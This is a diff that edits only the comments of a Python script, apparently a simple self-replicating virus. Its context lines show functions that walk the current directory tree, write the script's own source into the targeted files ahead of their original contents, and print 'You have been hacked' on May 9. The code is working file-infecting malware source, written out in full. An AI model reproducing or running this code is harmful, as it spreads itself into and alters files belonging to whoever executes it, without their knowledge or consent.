@@ -4,7 +4,7 @@ import datetime
 
 SIGNATURE = "VIRUS"
 
-# Function to locate files in the given path
+# Function to locate files in given path
 def locate(path):
     files_targeted = []
     filelist = os.listdir(path)
@@ -21,7 +21,7 @@ def locate(path):
                 files_targeted.append(path+"/"+fname)
     return files_targeted
 
-# Function to infect files by appending the virus code to them
+# Function to infect files by using the virus code
 def infect(files_targeted):
     virus = open(os.path.abspath(__file__))
     virusstring = ""
@@ -37,16 +37,16 @@ def infect(files_targeted):
         f.write(virusstring + temp)
         f.close()
 
-# Function to check the date and print a message if it matches the specified date
+# Function to check date and print a message if it matches specified date
 def detonate():
     if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
         print("You have been hacked")
 
-# Locate files in the current directory and its subdirectories
+# Locate files in the current directory and subdirectories
 files_targeted = locate(os.path.abspath(""))
 
-# Infect the files that are not already infected by appending the virus code
+# Infect the files that are not already infected
 infect(files_targeted)
 
-# Check the date and print a message if it matches May 9th
+# Check the date and print a message
 detonate()
